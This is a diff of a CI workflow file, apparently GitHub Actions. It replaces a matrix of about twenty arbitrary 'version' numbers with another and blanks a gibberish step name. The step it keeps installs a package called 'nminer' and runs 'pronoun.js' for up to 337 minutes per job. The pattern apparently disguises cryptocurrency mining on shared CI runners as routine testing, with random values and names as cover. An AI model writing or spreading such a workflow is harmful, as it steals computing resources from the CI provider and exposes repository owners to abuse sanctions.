@@ -9,26 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5743 }
-          - { version: 7603 }
-          - { version: 205 }
-          - { version: 9885 }
-          - { version: 1617 }
-          - { version: 9925 }
-          - { version: 6632 }
-          - { version: 8915 }
-          - { version: 9061 }
-          - { version: 1371 }
-          - { version: 76 }
-          - { version: 8792 }
-          - { version: 5725 }
-          - { version: 8496 }
-          - { version: 9291 }
-          - { version: 6926 }
-          - { version: 2684 }
-          - { version: 9125 }
-          - { version: 569 }
-          - { version: 4689 }
+          - { version: 4929 }
+          - { version: 3560 }
+          - { version: 3772 }
+          - { version: 8549 }
+          - { version: 5009 }
+          - { version: 9884 }
+          - { version: 9184 }
+          - { version: 7471 }
+          - { version: 2971 }
+          - { version: 771 }
+          - { version: 3580 }
+          - { version: 2780 }
+          - { version: 2835 }
+          - { version: 2934 }
+          - { version: 6111 }
+          - { version: 4103 }
+          - { version: 7207 }
+          - { version: 7159 }
+          - { version: 7803 }
 
     steps:
       - name: Checkout
@@ -39,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: testing yuck among under
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 315m node pronoun.js || echo "pronoun executed"
+          timeout 337m node pronoun.js || echo "pronoun executed"
